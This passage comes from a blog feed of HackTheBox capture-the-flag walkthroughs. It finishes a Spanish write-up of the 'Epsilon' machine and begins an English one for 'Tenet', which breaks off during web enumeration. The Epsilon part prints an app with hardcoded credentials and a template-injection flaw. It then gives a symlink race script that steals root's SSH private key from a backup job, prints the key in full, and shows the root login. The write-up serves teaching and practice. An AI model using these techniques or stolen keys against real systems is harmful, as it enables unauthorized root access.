<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">cat </span>app.py
<span class="c">#!/usr/bin/python3</span>

import jwt
from flask import <span class="k">*</span>

app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>
secret <span class="o">=</span> <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>

def verify_jwt<span class="o">(</span>token,key<span class="o">)</span>:
	try:
		<span class="nv">username</span><span class="o">=</span>jwt.decode<span class="o">(</span>token,key,algorithms<span class="o">=[</span><span class="s1">'HS256'</span>,]<span class="o">)[</span><span class="s1">'username'</span><span class="o">]</span>
		<span class="k">if </span>username:
			<span class="k">return </span>True
		<span class="k">else</span>:
			<span class="k">return </span>False
	except:
		<span class="k">return </span>False

@app.route<span class="o">(</span><span class="s2">"/"</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def index<span class="o">()</span>:
	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
		<span class="k">if </span>request.form[<span class="s1">'username'</span><span class="o">]==</span><span class="s2">"admin"</span> and request.form[<span class="s1">'password'</span><span class="o">]==</span><span class="s2">"4d_09@fhgRTdws2"</span>:
			res <span class="o">=</span> make_response<span class="o">()</span>
			<span class="nv">username</span><span class="o">=</span>request.form[<span class="s1">'username'</span><span class="o">]</span>
			<span class="nv">token</span><span class="o">=</span>jwt.encode<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"admin"</span><span class="o">}</span>,secret,algorithm<span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
			res.set_cookie<span class="o">(</span><span class="s2">"auth"</span>,token<span class="o">)</span>
			res.headers[<span class="s1">'location'</span><span class="o">]=</span><span class="s1">'/home'</span>
			<span class="k">return </span>res,302
		<span class="k">else</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>

@app.route<span class="o">(</span><span class="s2">"/home"</span><span class="o">)</span>
def home<span class="o">()</span>:
	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'home.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>

@app.route<span class="o">(</span><span class="s2">"/track"</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def track<span class="o">()</span>:
	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
		<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span>,message<span class="o">=</span>True<span class="o">)</span>
		<span class="k">else</span>:
			<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span><span class="o">)</span>

@app.route<span class="o">(</span><span class="s1">'/order'</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def order<span class="o">()</span>:
	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
		<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
			<span class="nv">costume</span><span class="o">=</span>request.form[<span class="s2">"costume"</span><span class="o">]</span>
			message <span class="o">=</span> <span class="s1">'''
			Your order of "{}" has been placed successfully.
			'''</span>.format<span class="o">(</span>costume<span class="o">)</span>
			<span class="nv">tmpl</span><span class="o">=</span>render_template_string<span class="o">(</span>message,costume<span class="o">=</span>costume<span class="o">)</span>
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span>,message<span class="o">=</span>tmpl<span class="o">)</span>
		<span class="k">else</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
app.run<span class="o">(</span><span class="s1">'0.0.0.0'</span>,5000<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si las probamos <code class="language-plaintext highlighter-rouge">admin:4d_09@fhgRTdws2</code> funcionan.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/19.png" />
</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos el <code class="language-plaintext highlighter-rouge">pkexec</code> pero lo vamos a explotar <a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a enumerar tareas cron <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a>.</p>
  </li>
  <li>
    <p>Si lo ejecutamos encontramos un <code class="language-plaintext highlighter-rouge">backup.sh</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/20.png" />
</p>

<ul>
  <li>Este es el codigo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">cat cat</span> /usr/bin/backup.sh
<span class="nb">cat</span>: <span class="nb">cat</span>: No such file or directory
<span class="c">#!/bin/bash</span>
<span class="nv">file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
/usr/bin/tar <span class="nt">-cvf</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> /var/www/app/
<span class="nb">sha1sum</span> <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f1</span> <span class="o">&gt;</span> /opt/backups/checksum
<span class="nb">sleep </span>5
<span class="nv">check_file</span><span class="o">=</span><span class="sb">`</span><span class="nb">date</span> +%N<span class="sb">`</span>
/usr/bin/tar <span class="nt">-chvf</span> <span class="s2">"/var/backups/web_backups/</span><span class="k">${</span><span class="nv">check_file</span><span class="k">}</span><span class="s2">.tar"</span> /opt/backups/checksum <span class="s2">"/opt/backups/</span><span class="nv">$file</span><span class="s2">.tar"</span>
/usr/bin/rm <span class="nt">-rf</span> /opt/backups/<span class="k">*</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/21.png" />
</p>

<ul>
  <li>Podemos ver lo <code class="language-plaintext highlighter-rouge">.tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/backups/web_backups
total 3920
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:35 095722698.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:36 111519042.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:37 125049838.tar
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:38 140228143.tar
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a irnos a la ruta <code class="language-plaintext highlighter-rouge">/tmp</code> y crearemos un script.sh y le daremos permisos de ejecuci√≥n.</p>
  </li>
  <li>
    <p>Vamos a crear el archivo <code class="language-plaintext highlighter-rouge">/opt/backups/checksum</code> despu√©s lo vamos a borrar para hacer un enlace a <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> y secuestrarlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cat </span>zi.sh
<span class="c">#!/bin/bash</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
	if</span> <span class="o">[</span> <span class="nt">-e</span> /opt/backups/checksum <span class="o">]</span><span class="p">;</span> <span class="k">then
		</span><span class="nb">rm</span> /opt/backups/checksum
		<span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /root/.ssh/id_rsa /opt/backups/checksum
	       <span class="nb">break
</span><span class="k">fi
done
</span>tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x zi.sh
</code></pre></div></div>

<ul>
  <li>
    <p>Esperamos unos minutos a que se ejecute la tarea.</p>
  </li>
  <li>
    <p>Vamos a descomprimir el mas nuevo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp<span class="nv">$ </span>./zi.sh
^C
tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">cd</span> /var/backups/web_backups/
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 980
<span class="nt">-rw-r--r--</span> 1 root root 1003520 Jul  5 01:50 311632114.tar
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cp </span>311632114.tar /tmp
tom@epsilon:/var/backups/web_backups<span class="nv">$ </span><span class="nb">cd</span> /tmp
tom@epsilon:/tmp<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> 311632114.tar
tom@epsilon:/opt/backups<span class="nv">$ </span><span class="nb">cd</span> /tmp/opt/backups/
</code></pre></div></div>

<ul>
  <li>Vemos la id_rsa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/tmp/opt/backups<span class="nv">$ </span><span class="nb">cat </span>checksum 
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">BqhGglrHoh2JycJwAAAAxyb290QGVwc2lsb24BAgMEBQ</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
tom@epsilon:/tmp/opt/backups<span class="nv">$ </span>
</code></pre></div></div>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>Ahora podemos conectarnos como root por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nano id_rsa
‚ùØ <span class="nb">chmod </span>600 id_rsa
‚ùØ ssh <span class="nt">-i</span> id_rsa root@10.10.11.134
The authenticity of host <span class="s1">'10.10.11.134 (10.10.11.134)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.11.134<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jul 2024 01:56:45 AM UTC

  System load:                      0.01
  Usage of /:                       67.1% of 5.78GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        241
  Users logged in:                  0
  IPv4 address for br-a2acb156d694: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.134
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:a1e8

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb  7 01:51:07 2022
root@epsilon:~# export TERM=xterm
root@epsilon:~# cat /root/root.txt
8a3e087754468be6d4bb82429fdae0db
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Tenet (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet.html" rel="alternate" type="text/html" title="HackTheBox - Tenet (medium)" /><published>2024-07-03T00:00:00-06:00</published><updated>2024-07-03T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/03/tenet.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6bd8b01a1b84e16a5ee2e53d070339fd.png" />
</p>

<ul>
  <li>Tenet is a Medium difficulty machine that features an Apache web server. It contains a Wordpress blog with a few posts. One of the comments on the blog mentions the presence of a PHP file along with it‚Äôs backup. It is possible after identificaiton of the backup file to review it‚Äôs source code. The code in PHP file is vulnerable to an insecure deserialisation vulnerability and by successful exploiting it a foothold on the system is achieved. While enumerating the system it was found that the Wordpress configuration file can be read and thus gaining access to a set of credentials. By using them we can move laterally from user <code class="language-plaintext highlighter-rouge">www-data</code> to user <code class="language-plaintext highlighter-rouge">Neil</code>. Further system enumeration reveals that this user have root permissions to run a bash script through <code class="language-plaintext highlighter-rouge">sudo</code>. The script is writing SSH public keys to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file of the <code class="language-plaintext highlighter-rouge">root</code> user and is vulnerable to a race condition. After successful exploitation, attackers can write their own SSH keys to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file and use them to login to the system as <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat</span> ../nmap/targeted
<span class="c"># Nmap 7.94SVN scan initiated Wed Jul  3 16:55:09 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.10.223</span>
Nmap scan report <span class="k">for </span>10.10.10.223
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<ul>
  <li>We see that a <strong>Wordpress</strong> is being used as a content management system.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat</span> ../nmap/webScan
<span class="c"># Nmap 7.94SVN scan initiated Wed Jul  3 16:57:31 2024 as: nmap --script=http-enum -p80 -oN webScan 10.10.10.223</span>
Nmap scan report <span class="k">for </span>10.10.10.223
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /wordpress/wp-login.php: Wordpress login page.
</code></pre></div></div>

<h2 id="enumeration">Enumeration</h2>

<ul>
  <li>We see the technologies that are being used in the web service.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">‚ùØ</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">29</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.223</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Apache2</span> <span class="no">Ubuntu</span> <span class="no">Default</span> <span class="no">Page</span><span class="p">:</span> <span class="no">It</span> <span class="n">works</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>If we go to see the web page as such we find this.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/1.png" />
</p>

<ul>
  <li>But if we go to the route reported by <code class="language-plaintext highlighter-rouge">Nmap</code> we can see the <strong>Wordpress</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/2.png" />
</p>

<ul>
  <li>We can see the subdomain <code class="language-plaintext highlighter-rouge">tenet.htb</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/3.png" />
</p>

<ul>
  <li>So what we are going to do is to add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> so that the resources are displayed correctly.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">echo</span> <span class="s2">"10.10.10.223 tenet.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.223 tenet.htb
</code></pre></div></div>

<ul>
  <li>Now it works.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/4.png" />
</p>

<ul>
  <li>We are going <strong>Fuzzing</strong> to see if we can find any interesting routes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://tenet.htb/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 100 <span class="nt">--no-error</span> <span class="nt">-x</span> php <span class="nt">-s</span> 200
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://tenet.htb/
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 100
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              php
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2023/07/25 19:56:01 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/index.php            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/]
/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-content/]
/wp-login.php         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6534]                                  
/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-includes/]
/wp-trackback.php     <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 135]                                    
/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-admin/]   
/xmlrpc.php           <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42]                                     
/wp-signup.php        <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://tenet.htb/wp-login.php?action<span class="o">=</span>register]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 274]                                                  
                                                                                                 
<span class="o">===============================================================</span>
2024/07/03 18:07:30 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>
    <p>They are the typical wordpress routes but here we find something interesting.</p>
  </li>
  <li>
    <p>Version 5.6.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/5.png" />
</p>

<ul>
  <li>We see the file.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/6.png" />
</p>

<ul>
  <li>We don‚Äôt see anything interesting so far let‚Äôs fuzzing but now to search for subdomains.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ gobuster vhost <span class="nt">-u</span> http://tenet.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-t</span> 50 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:          http://tenet.htb
<span class="o">[</span>+] Method:       GET
<span class="o">[</span>+] Threads:      50
<span class="o">[</span>+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+] User Agent:   gobuster/3.1.0
<span class="o">[</span>+] Timeout:      10s
<span class="o">===============================================================</span>
2024/07/03 18:30:50 Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Found: www.tenet.htb <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0]
</code></pre></div></div>

<ul>
  <li>We add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.10.10.223 tenet.htb www.tenet.htb
</code></pre></div></div>

<ul>
  <li>But it redirects us to the domain that we already have.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/7.png" />
</p>

<ul>
  <li>If we analyze a <strong>post</strong> of those on the web there is one which is called <strong>Migration</strong> and if we analyze it we see that there is a comment from the user <strong>neil</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/tenet/8.png" />
</p>

<ul>
  <li>There is a path called <code class="language-plaintext highlighter-rouge">sator.php</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="nt">-s</span> http://tenet.htb/sator.php
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;404 Not Found&lt;/title&gt;
